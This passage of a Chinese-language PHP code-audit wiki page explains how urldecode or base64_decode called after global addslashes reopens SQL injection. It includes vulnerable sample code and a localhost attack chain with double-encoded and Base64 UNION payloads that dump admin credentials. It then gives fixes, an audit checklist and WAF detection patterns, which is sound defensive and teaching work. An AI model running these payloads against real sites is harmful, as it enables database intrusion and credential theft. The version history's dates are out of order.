| `base64_decode()` | `JTI3` (base64编码的 `%27`) | `JTI3` (字母数字，不变) | `%27` → 需配合 `urldecode` 或直接 `'` (若直接编码 `'`) | 直接编码单引号 `JyA=` 解码即得 `'` |
| `hex2bin()` / `pack()` | `27` (十六进制) | `27` (不变) | `'` | 类似 Base64 |

> **审计口诀**：搜索 `urldecode(`、`rawurldecode(`、`base64_decode(`、`hex2bin(`、`pack(`；检查调用位置是否在 **全局 `addslashes`/GPC 之后**、**SQL 拼接之前**；重点关注**ID 解密、Token 解析、加密参数传递、API 接口解密**等业务场景。

### 实战案例复现（301在路上归档文章：代码审计的艺术系列—第二篇）

#### 缺陷代码
```php
<?php
require_once('common.php');  // common.php 中对 $_GET 执行了 addslashes_deep
$conn = mysql_connect('localhost', 'root', 'braid') or die('bad!');
mysql_query("SET NAMES binary");
mysql_select_db('test', $conn) OR emMsg("数据库连接失败");
// 关键点：全局转义后，业务代码再次 urldecode
$id = isset($_GET['id']) ? urldecode($_GET['id']) : 1;
// SQL 语句有单引号保护
$sql = "SELECT * FROM news WHERE id='{$id}'";
$result = mysql_query($sql, $conn) or die(mysql_error()); 
?>
```

#### `common.php` 全局防护逻辑
```php
if (!empty($_GET)) { $_GET  = addslashes_deep($_GET); }
if (!empty($_POST)) { $_POST = addslashes_deep($_POST); }
if (!empty($_COOKIE)) { $_COOKIE = addslashes_deep($_COOKIE); }

function addslashes_deep($value) {
    if (empty($value)) return $value;
    if (!get_magic_quotes_gpc()) {
        $value = is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value);
    } else {
        $value = is_array($value) ? array_map('addslashes_deep', $value) : mystrip_tags($value);
    }
    return $value;
}
```

#### 攻击链复现
1. **正常测试**：访问 `http://localhost/sqltest/urldecode.php?id=1'`  
   - PHP 引擎自动 URL 解码一次：`$_GET['id']` = `1'`  
   - `common.php` `addslashes`：`1\'`  
   - 业务代码 `urldecode`：无效果（无 `%`）  
   - SQL：`SELECT * FROM news WHERE id='1\''` → 语法错误，但单引号被转义，注入失败。

2. **双重编码绕过**：访问 `http://localhost/sqltest/urldecode.php?id=1%2527`  
   - PHP 引擎自动 URL 解码一次：`$_GET['id']` = `1%27` (即 `1'`)  
   - `common.php` `addslashes`：输入为 `1%27`，无单引号/反斜杠，**不转义**，返回 `1%27`。  
   - 业务代码 `urldecode($_GET['id'])`：`urldecode('1%27')` → `1'`。  
   - SQL：`SELECT * FROM news WHERE id='1''` → 单引号闭合，注入成功。

3. **构造 UNION 注入 Payload**：
   - `http://localhost/sqltest/urldecode.php?id=1%2527%20union%20select%201,2,concat(name,0x23,pass)%20from%20admin%23`
   - 解码后：`1' union select 1,2,concat(name,0x23,pass) from admin#`
   - 成功获取管理员账号密码。

#### Base64 变种示例
```php
// vuln_base64.php
require_once('common.php');
$token = isset($_GET['token']) ? base64_decode($_GET['token']) : '';
$sql = "SELECT * FROM users WHERE token='{$token}'";
```
- 攻击者构造 `token=JyB1bmlvbiBzZWxlY3QgMSwyLDMsNCBmcm9tIGFkbWluIw==` (Base64(`' union select 1,2,3,4 from admin#`))
- `$_GET['token']` 经 `addslashes` 无变化（字母数字/+ / =）。
- `base64_decode` 还原为 `' union select 1,2,3,4 from admin#`。
- SQL 拼接后单引号闭合，注入触发。

### 修复方案

| 方案 | 说明 | 优先级 |
|------|------|--------|
| **调整时序：解码在转义/参数化前** | 入口文件统一：**先解码/规范化输入，再强制类型/长度，最后参数化绑定**。 | P0 |
| **禁止业务层裸用解码函数拼接 SQL** | 若必须解码，解码后立即使用参数化查询，或显式调用 `mysqli_real_escape_string`（不推荐）。 | P0 |
| **双重编码规范化检测** | WAF/RASP 层面检测 `%2527`、`%255c` 等双重编码特征；应用层 `urldecode` 循环直到无变化后再处理（需谨慎，防死循环）。 | P1 |
| **Base64/JSON 等结构化数据校验** | 解码后验证数据格式（如 JSON Schema、UUID 格式、长度限制），拒绝含 SQL 关键字的异常数据。 | P1 |
| **统一输入处理中间件** | 框架层实现 `Input::get('param', 'int')` 等强类型获取器，内部封装解码、转义、参数化，禁止控制器直接操作超全局变量。 | P0 |

### 关联审计模式
- [[301-zai-lushang-wechat-archive-201508-202208]]：文章来源归档索引，包含「代码审计的艺术系列」第二篇原文。
- [[code-audit-widebyte-sql-injection-iconv]]：同属“转义后处理导致绕过”类别，编码转换与解码函数均为时序缺陷。
- [[php-file-inclusion-vulnerability]]：文件包含场景中 `urldecode` 导致的路径遍历绕过（如 `..%252f`）属同类机制。
- [[ssrf-bypass-techniques]]：SSRF 中 URL 双重编码绕过过滤器（如 `http://example.com/%252f%252f...`）属同类解码时序利用。
- [[xd-security-code-audit-notes-day50-57]]：代码审计关键字搜索策略中应新增 `urldecode`、`base64_decode`、`rawurldecode` 等解码函数。

---

## 统一审计检测清单

| 检测项 | 搜索模式 | 判断标准 | 修复优先级 |
|--------|----------|----------|------------|
| 整型参数未强制转换 | `id=`/`page=`/`cid=` 等参数直接入 SQL | 无 `intval()`/`(int)`/`ctype_digit()`，SQL 无单引号包裹 | P0 |
| 数组键名未转义 | `foreach($_POST as $k=>$v)` 仅处理 `$v` | 业务使用数组参数且键名拼接入 SQL | P0 |
| SERVER 变量未转义 | 全局转义代码无 `$_SERVER` 遍历 | 存在 IP 获取入库、日志记录、统计分析等场景 | P0 |
| FILES 未转义 | `addslashes`/`mysql.*escape` 附近无 `$_FILES` 遍历 | 存在上传功能且文件名/类型入库 | P0 |
| `extract()` 默认覆盖 | `extract\(` 无第二参数或 `EXTR_OVERWRITE` | 变量来源可控（`$_GET/$_POST/$_REQUEST/$_COOKIE/$_FILES/$_SERVER`） | P0 |
| `parse_str()` 无数组参数 | `parse_str\([^,)]+\)` | PHP < 8.0 环境 | P1 |
| `$$` 变量变量赋值 | `\$\$[a-zA-Z_]` | 变量名来源可控 | P1 |
| 覆盖关键变量 | 结合上下文：`$pre`、`$table`、`$path`、`$config`、`$auth` 等 | 被覆盖后用于 SQL 拼接/文件包含/鉴权判断 | P0 |
| **编码转换在转义后** | `iconv(`/`mb_convert_encoding(` 位于全局 `addslashes`/GPC **之后** | 存在 GBK/UTF-8 互转且结果直接拼接 SQL | P0 |
| **数据库连接字符集** | `SET NAMES gbk` / `charset=gbk` / `character_set_client=gbk` | 未使用 `utf8mb4`，且应用层有编码转换 | P0 |
| **转义后调用 str_replace 删引号/反斜杠** | `addslashes`/`GPC` 后出现 `str_replace("'", ...)` 或 `str_replace('\\', ...)` | 导致残留反斜杠转义后续引号或消解转义 | P0 |
| **转义后调用 stripslashes** | `addslashes`/`GPC` 后出现 `stripslashes(`/`stripcslashes(` | 直接抵消全局防护 | P0 |
| **二次注入隐患** | `INSERT`/`UPDATE` 入库点 → `SELECT` 取出 → 直接拼接新 SQL | 读取数据未重新转义/参数化即入库/查询 | P0 |
| **解码函数在转义后调用** | `addslashes`/`GPC` 后出现 `urldecode(`/`base64_decode(`/`rawurldecode(`/`hex2bin(` | 解码后数据直接拼接 SQL，且输入可控编码 Payload | P0 |
| **双重编码绕过** | 参数值含 `%2527`、`%255c`、`JTI3` 等特征 | 经 PHP 自动解码 + 业务 `urldecode` 双重解码还原危险字符 | P0 |

---

## 防御纵深建议

1. **架构层**：
   - 全面采用 **PDO/Prepared Statements** 消除 SQL 拼接。
   - 模板引擎强制 **沙箱渲染**（如 Blade、Twig `autoescape`），禁止原生 `include`/`extract` 渲染。
   - **统一字符集**：全栈统一 UTF-8（数据库 `utf8mb4`、连接 `charset=utf8mb4`、页面 `<meta charset="utf-8">`、PHP `default_charset="UTF-8"`），禁用 GBK 等多字节编码。

2. **框架层**：
   - 入口统一 **输入规范化**（Normalization）：**先解码/编码统一/转换，再类型强制/长度截断，最后参数化绑定**，覆盖所有超全局数组（`$_GET/$_POST/$_COOKIE/$_REQUEST/$_FILES/$_SERVER/$_ENV`）。
   - 核心配置（表前缀、路径、密钥）定义为 **常量/只读属性**，不可被变量覆盖。
   - 提供 **安全封装函数**：`safe_intval()`、`safe_encoding_convert()`、`safe_extract($whitelist)`、`safe_decode($input, $type)` 等，禁止直接使用裸函数。
   - **禁止在输入处理链路中使用 `str_replace`/`stripslashes` 处理引号/反斜杠**。

3. **代码层**：
   - 代码规范禁用 `extract`、`parse_str`、`$$`、`register_globals` 兼容代码、`SET NAMES gbk`、`iconv` 直接拼接 SQL、`str_replace` 删引号、`stripslashes`、`urldecode` 后拼接 SQL。
   - CodeReview Checklist 必查项：
     - “用户输入是否直接作为变量名/键名使用”
     - “数字型参数是否强制转型”
     - “所有超全局数组是否均纳入参数化/转义”
     - “编码转换/解码操作是否在参数化/转义**之前**完成”
     - “数据库连接字符集是否为 `utf8mb4`”
     - “是否存在转义后再清理转义字符的操作”
     - “从数据库读取的数据再次入库/拼接 SQL 时是否参数化”
     - “是否存在业务代码直接调用 `urldecode`/`base64_decode` 后拼接 SQL”

4. **运维层**：
   - WAF/IDS 规则检测 `filename=`、`name=` 等上传字段、`X-Forwarded-For` 等头部、`iconv` 相关参数中的 SQL 关键字及宽字节特征（`%df%27`、`%e5%5c` 等）、**双重编码特征**（`%2527`、`%255c`、Base64 编码的 SQL 关键字）。
   - 部署 **RASP/IAST**（如 OpenRASP、洞态）运行时监测 `extract`/`include`/`iconv`/`str_replace`/`stripslashes`/`urldecode`/`base64_decode` 危险调用参数污点传播。
   - 定期执行 **编码一致性扫描**：检查数据库、表、列、连接、应用、页面编码是否全链路 UTF-8。

---

## 交叉引用索引

- 文件操作漏洞挖掘总论：[[code-audit-file-operation-vulnerabilities]]
- 文件上传漏洞完整方法论：[[code-audit-file-upload-vulnerabilities]]
- 安装/重装逻辑缺陷（含变量覆盖）：[[code-audit-installation-reinstallation-vulnerabilities]]
- HDWiki 任意文件下载/删除审计：[[arbitrary-file-download-vulnerability-analysis]]
- Catfish CMS 任意图片删除审计：[[catfish-cms-arbitrary-image-deletion]]
- 飞飞CMS 任意文件删除审计：[[feifei-cms-arbitrary-file-deletion]]
- IWebShopCMS 任意文件删除审计：[[iwebshop-cms-arbitrary-file-deletion]]
- 湖湘杯 WillPHP 文件包含变量覆盖实战：[[huxiangbei-willphp-file-inclusion-writeup]]
- PHP 文件包含漏洞基础：[[php-file-inclusion-vulnerability]]
- Upload-Labs 文件上传绕过全关卡：[[upload-labs-file-upload-bypass-writeup]]
- 逻辑漏洞密码重置审计（含变量覆盖）：[[logic-vulnerability-password-reset-audit]]
- XD安全代码审计笔记（关键字搜索策略）：[[xd-security-code-audit-notes-day50-57]]
- Oasys 系统代码审计实战：[[oasys-system-code-audit]]
- HTTP 头伪造存储型 XSS：[[http-header-forgery-stored-xss]]
- SSRF 绕过技术：[[ssrf-bypass-techniques]]
- PHP Webshell 基础与免杀（含 str_replace 免杀对抗）：[[php-webshell-fundamentals-chopper-analysis]]
- XD安全 WAF 绕过技术（Payload 变异）：[[xd-security-waf-bypass-techniques-day46-49]]
- WeCenter Phar 反序列化二次注入：[[wecenter-v334-phar-deserialization-sqli]]
- XD安全逻辑漏洞笔记（多阶段绕过）：[[xd-security-logic-vulnerability-notes-day33-36]]
- 宽字节注入 Iconv 专题：[[code-audit-widebyte-sql-injection-iconv]]
- 二次注入专题：[[code-audit-second-order-sqli]]
- 301在路上微信归档索引：[[301-zai-lushang-wechat-archive-201508-202208]]

---

## 版本历史

| 版本 | 日期 | 变更摘要 |
|------|------|----------|
| 1.0 | 2016-06-24 | 初稿：基于 HackBraid「代码审计的艺术系列第六季」整理 FILES 注入与变量覆盖两大盲点 |
| 1.1 | 2025-08-19 | 结构化重写：增加原理表格、利用链标准化、修复方案对比、统一检测清单、防御纵深建议、交叉引用索引 |
| 2.0 | 2026-11-16 | **重大更新**：融合第五季内容，新增整型注入绕过、数组键名注入、SERVER变量注入三大盲点，形成五大盲点完整知识体系；更新标题、描述、标签、检测清单、防御建议、交叉引用 |
| 2.1 | 2025-08-20 | **重大更新**：融合第四季内容，新增**字符编码转换绕过（iconv/mb_convert_encoding 宽字节注入）**作为第六大盲点，覆盖 GBK→UTF-8 与 UTF-8→GBK 双向利用链，完善检测清单与防御建议，更新标题、描述、标签、版本历史 |
| 2.2 | 2026-11-17 | **重大更新**：融合第三季内容，新增**函数误用绕过（str_replace/stripslashes 误用）**与**二次注入**作为第七、八大盲点，完善 PHP 全局防护绕过技术谱系；更新标题、描述、标签、检测清单、防御建议、交叉引用、版本历史 |
| 2.3 | 2026-11-17 | **重大更新**：融合 301在路上 归档文章《代码审计的艺术系列—第二篇》内容，新增**解码函数二次解码绕过（urldecode/base64_decode 在 addslashes 后执行）**作为第九大盲点，补全全局防护盲点知识体系最后一环；更新标题、描述、标签、检测清单、防御建议、交叉引用、版本历史 |

## 来源

- [301在路上-201508-202208_121](../sources/301在路上-201508-202208_121.md)
- [301在路上-201508-202208_132](../sources/301在路上-201508-202208_132.md)
- [301在路上-201508-202208_142](../sources/301在路上-201508-202208_142.md)
- [301在路上-201508-202208_145](../sources/301在路上-201508-202208_145.md)
- [301在路上-201508-202208_147](../sources/301在路上-201508-202208_147.md)
